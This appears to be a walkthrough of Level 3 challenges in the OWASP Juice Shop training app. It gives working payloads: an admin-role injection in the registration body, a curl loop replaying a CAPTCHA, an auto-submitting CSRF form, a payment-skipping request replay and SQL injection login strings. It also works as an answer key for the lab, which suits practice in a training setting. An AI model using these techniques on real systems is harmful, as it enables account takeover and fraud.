# Level 3

## Admin Registration (Improper Input Validation)
_Register as a user with administrator privileges._

Modify the body of the user registration request (`POST /api/Users/`) by adding `"role":"admin",`:
```
{
  "email": "admin@mail",
  "role": "admin",
  "password": "admin1",
  "passwordRepeat": "admin1",
  "securityQuestion": {
    "id": 1,
    "question": "Your eldest siblings middle name?",
    "createdAt": "2020-08-13T14:12:54.775Z",
    "updatedAt": "2020-08-13T14:12:54.775Z"
  },
  "securityAnswer": "Whatever"
}
```

## Bjoern's Favorite Pet (Broken Authentication)
_Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question._

Google for `bjoern kimminich cat name`.
One of the sources is this YouTube video https://www.youtube.com/watch?v=Lu0-kDdtVf4 (4:20).

The pet's name is `Zaya`

## CAPTCHA Bypass (Broken Anti Automation)
_Submit 10 or more customer feedbacks within 10 seconds._

CAPTCHA is broken. The computation result is bound to `captchaId`.
We can simply bypass it by sending the same id and the same result over and over again. 

Bash script to send the request 10 times:
```
BEARER='eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9. ..'
for i in {1..10}
do
    curl -i -X POST \
        -H 'Content-Type: application/json' \
        -H "Authorization: Bearer $BEARER" \
        --data '{"captchaId":0,"captcha":"24","comment":"AAA (anonymous)","rating":3}' \
        https://vernjan-juice-shop.herokuapp.com/api/Feedbacks/
done
```

## CSRF (Broken Access Control)
_Change the name of a user by performing Cross-Site Request Forgery from [another origin](http://htmledit.squarefree.com/)._

This **no longer works in modern web browsers**.

The idea is to craft a form similar to this:
```
<form action="YOUR_URL/profile" method="POST">
  <input type="text" id="username" name="username" value="John">
  <input type="submit" value="Submit">
</form> 
<script>document.forms[0].submit();</script>
```

## Deluxe Fraud (Improper Input Validation)
_Obtain a Deluxe Membership without paying for it._

Log in as a standard customer (not admin) and pay for the Deluxe membership (in top left menu).

This is the important request:
```
POST YOUR_URL/rest/deluxe-membership
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9. ..
Content-Type: application/json

{"paymentMode":"card"}
```

The trick is to use a payment method you _don't really have_. For example, create a new user
(do not add any payment cards) and replay this exact request (just update the `Authorization` header).

## Login Bender (Injection)
_Log in with Bender's user account._

The same as [Login Jim](#login-jim) challenge.

## Login Jim ()
_Log in with Jim's user account._

We need two things: email and password

Email is easy. Once you have the admin access, you can see it in _Administration_. It's `jim@juice-sh.op`.

To bypass the password check, we can use a simple SQL injection:
`jim@juice-sh.op';` or `jim@juice-sh.op'--`